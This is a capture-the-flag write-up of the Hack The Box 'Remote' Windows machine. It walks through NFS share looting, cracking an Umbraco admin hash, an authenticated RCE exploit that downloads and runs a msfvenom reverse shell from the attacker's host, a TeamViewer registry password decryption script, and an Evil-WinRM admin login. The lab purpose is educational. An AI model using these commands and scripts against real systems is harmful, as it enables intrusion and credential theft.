---
description: 09-26-22
---

# Remote (Easy)

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /blog/: Blog
|   /home.aspx: Possible admin folder
|   /contact/: Potentially interesting folder
|   /home/: Potentially interesting folder
|_  /intranet/: Potentially interesting folder
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
```

Enumerated UDP ports:

```
PORT     STATE SERVICE
111/udp  open  rpcbind
2049/udp open  nfs
```

Notes:

* 21/FTP - <mark style="color:yellow;">Attempted anonymous login regardless of nmap report and it allowed me to authenticate via anonymous</mark>.
  * Enumerated, and I found nothing
  * Can we place a file? -- No
* 80/HTTP - <mark style="color:yellow;">Microsoft Ajax Content Delivery Network -- jQuery 1.13.1 JS (Library)</mark>
  * Ran directory bruteforce x
  * Nikto scan
  * Vhost enumeration x
  * Subdomain enumeration x
  * Source code analysis -- I see all sorts of interesting stuff here
    * Wile E. Coyote
    * /cg16 x
    * /codegarden x
    * /umbraco
    * /great x

Script:

```
<script src="https://code.jquery.com/jquery-3.1.0.min.js" integrity="sha256-cCueBR6CsyA4/9szpPfrX3s49M9vUU5BgtiJj06wt/s=" crossorigin="anonymous"></script>
```

* Let's check out the rest of the site...
* /products x
* /People -- We get a list of people! x
  * Jan Skovgaard
  * Matt Brailsford
  * Lee Kelleher
  * Jeavon Leopold
  * Jeroen Breuer
* /umbraco looks the most suspicious
* This turns out to be a CMS and I begin to do some research on it
* 2049/NFS - <mark style="color:yellow;">Enumerate and see if there is anything that we can access</mark>
* 5985/WinRM - <mark style="color:yellow;">We can authenticate with hashes or creds if obtained</mark>

## Enumeration

### Port 80 - HTTP (MS Ajax)

Dirsearch:

```
Target: http://10.129.227.150/

[20:52:08] Starting: 
[20:52:12] 200 -    7KB - /Home                                            
[20:52:13] 200 -    5KB - /Products                                        
[20:52:13] 200 -    5KB - /Blog                                            
[20:52:15] 200 -    7KB - /People                                           
[20:52:15] 200 -    8KB - /Contact                                          
[20:52:19] 200 -    5KB - /blog                                             
[20:52:25] 200 -    8KB - /contact                                          
[20:52:36] 200 -    7KB - /home                                             
[20:52:37] 302 -  126B  - /install  ->  /umbraco/                           
[20:52:37] 200 -    3KB - /intranet                                         
[20:52:40] 500 -    3KB - /master                                           
[20:52:44] 200 -    7KB - /people                                           
[20:52:46] 200 -    3KB - /person                                           
[20:52:47] 200 -    5KB - /products                                         
[20:52:49] 500 -    3KB - /product                                          
[20:52:49] 400 -    3KB - /render/https://www.google.com                    
[20:52:56] 200 -    4KB - /umbraco 
```

* /umbraco looks to be the most interesting as it is a login page
* http://10.129.227.150/about-us/todo-list-for-the-starter-kit/ looks interesting as well. It has a to-do list in it

### Port 2049 - NFS

* Attempted to see if there was anything on this file share that would help us exploit the target

Showmount:

```
showmount -e 10.129.60.40                                                                                         Fri 30 Sep 2022 01:43:27 PM EDT
Export list for 10.129.60.40:
/site_backups (everyone)
```

* We see that everyone has access to /site\_backups
* Let's mount that to our file system and access the files

Mount:

```
sudo mkdir /mnt/Remote-Backup

sudo mount -t nfs 10.129.60.40:/site_backups /mnt/Remote_Backup/ -o nolock
```

Copying and accessing the file share:

<pre><code><strong>mkdir nfs-loot
</strong><strong>cp -R /mnt/Remote-Backup/* nfs-loot/
</strong>cd nfs-loot
</code></pre>

* There are lots of files in here; this will take some time
* What we are doing is looking for hard-coded credentials
* Let's do some research on Umbraco

{% embed url="https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data#comment-190162" %}

* There is an .sdf file... let's try and find it
* This can be found in the App\_Data file
* Supposedly, the password will be hashed

Running strings on /App\_Data/Umbraco.sdf:

```
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

* These look like SHA1 hashes

{% embed url="https://our.umbraco.com/forum/core/general/53147-Questions-regarding-how-Umbraco-stores-and-hashes-passwords" %}

SHA1 Hash:

```
b8be16afba8c314ad33d812f22a04991b90e2aaa
```

* I placed this hash in a text file called hash

Cracking w/ John The Ripper:

```
sudo john --wordlist:/usr/share/wordlists/rockyou.txt hash

baconandcheese
```

* admin@htb.local:baconandcheese
* Navigate to the umbraco login page and login

<figure><img src="../../../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption></figcaption></figure>

* Here is where I asked myself the question "okay what can we do with our admin credentials in the Umbraco CMS?"

Searchsploit:

```
searchsploit umbraco                                                                                              Fri 30 Sep 2022 05:00:51 PM EDT
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Metasploit)                                                                            | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution                                                                     | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated)                                                                     | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal                                                                                        | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross-Site Scripting                                                                     | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseUrl' SSRF
```

* We have credentials, so I instantly identify the Authenticated RCE's&#x20;
* I choose to use the <mark style="color:yellow;">49488.py</mark> exploit

## Exploitation

### 49488.py

Finding a writeable directory:

```
python 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.60.40' -c powershell.exe -a "ls C:/" 
```

* We see ftp\_transfer

Creating payload w/ msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=1337 -f exe > shell-x64.exe
```

* Must be a <mark style="color:yellow;">stageless payload</mark>

Start nc listener:

```
nc -lnvp 1337
```

Start HTTP server for file transfer:

```
python3 -m http.server
```

Transfer payload to target:

```
python 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.60.40' -c powershell.exe -a "-NoP Invoke-WebRequest -Uri 'http://10.10.16.2:8000/shell-x64.exe' -Outfile 'C:/ftp_transfer/shell-x64.exe'"
```

Detonate the reverse shell payload:

```
python 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.60.40' -c powershell.exe -a "C:/ftp_transfer/shell-x64.exe"
```

<figure><img src="../../../.gitbook/assets/image (7) (2) (2).png" alt=""><figcaption><p>Shell</p></figcaption></figure>

## Privilege Escalation

{% embed url="https://whynotsecurity.com/blog/teamviewer/" %}

### Local enumeration

* The first thing that I do is run net use and add my SMB server to the target
* Next, I load WinPEAS&#x20;

```
net use \\10.10.16.2\smb
copy \\10.10.16.2\smb\winPEASx64.exe
.\winPEASx64.exe
```

* Unfortunately, I could not find anything
* After enumerating the file system, specifially Program Files (x86), I notice the TeamViewer is installed
* I also noticed that it is running version 7 hence the directory name

Supposedly, we can use this registry key to decrypt the hash:

```
reg query HKLM\SOFTWARE\WOw6432Node\TeamViewer\Version7 /v SecurityPasswordAES
HKEY_LOCAL_MACHINE\SOFTWARE\WOw6432Node\TeamViewer\Version7                                                                                                      
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
```

REG\_BINARY:  <mark style="color:yellow;">FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</mark>

* We then take the REG\_BINARY and put it in the decryption tool found on GitHub

Decryption code:

```
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B"                     # output from the registry

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```

* <mark style="color:yellow;">Replace the hex string cipher part with the REG\_BINARY you received from the registry query</mark>

<figure><img src="../../../.gitbook/assets/image (5) (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Upon executing this script, I get the value !R3m0te!

### Evil-WinRM for the win

```
evil-winrm -i 10.129.77.90 -u administrator                                                                       Fri 30 Sep 2022 08:16:43 PM EDT
Enter Password: !R3m0te!


Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
